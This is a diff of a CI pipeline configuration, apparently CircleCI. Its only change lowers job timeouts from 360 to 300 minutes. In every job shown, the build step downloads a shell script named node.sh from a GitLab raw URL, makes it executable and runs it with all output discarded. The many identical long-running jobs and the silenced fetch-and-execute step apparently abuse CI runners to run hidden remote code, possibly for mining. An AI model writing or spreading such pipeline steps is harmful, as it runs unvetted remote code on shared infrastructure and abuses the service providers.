@@ -9,7 +9,7 @@ jobs:
       - checkout
       - run: ls
       - run:
-          no_output_timeout: 362m
+          no_output_timeout: 300m
           
           command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1"              
       
@@ -22,7 +22,7 @@ jobs:
       - checkout
       - run: ls
       - run:
-          no_output_timeout: 360m
+          no_output_timeout: 300m
           
           command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1"
       
@@ -35,7 +35,7 @@ jobs:
       - checkout
       - run: ls
       - run:
-          no_output_timeout: 360m
+          no_output_timeout: 300m
           
           command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1"
       
@@ -48,7 +48,7 @@ jobs:
       - checkout
       - run: ls
       - run:
-          no_output_timeout: 360m
+          no_output_timeout: 300m
           
           command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1"
 
@@ -74,7 +74,7 @@ jobs:
       - checkout
       - run: ls
       - run:
-          no_output_timeout: 360m
+          no_output_timeout: 300m
           
           command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1"
       
@@ -87,7 +87,7 @@ jobs:
       - checkout
       - run: ls
       - run:
-          no_output_timeout: 360m
+          no_output_timeout: 300m
           
           command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1"
       
@@ -100,7 +100,7 @@ jobs:
       - checkout
       - run: ls
       - run:
-          no_output_timeout: 360m
+          no_output_timeout: 300m
           
           command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1" 
 
@@ -126,7 +126,7 @@ jobs:
       - checkout
       - run: ls
       - run:
-          no_output_timeout: 360m
+          no_output_timeout: 300m
           
           command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1"
       
@@ -139,7 +139,7 @@ jobs:
       - checkout
       - run: ls
       - run:
-          no_output_timeout: 360m
+          no_output_timeout: 300m
           
           command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1"
       
@@ -152,7 +152,7 @@ jobs:
       - checkout
       - run: ls
       - run:
-          no_output_timeout: 360m
+          no_output_timeout: 300m
           
           command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1"  
       
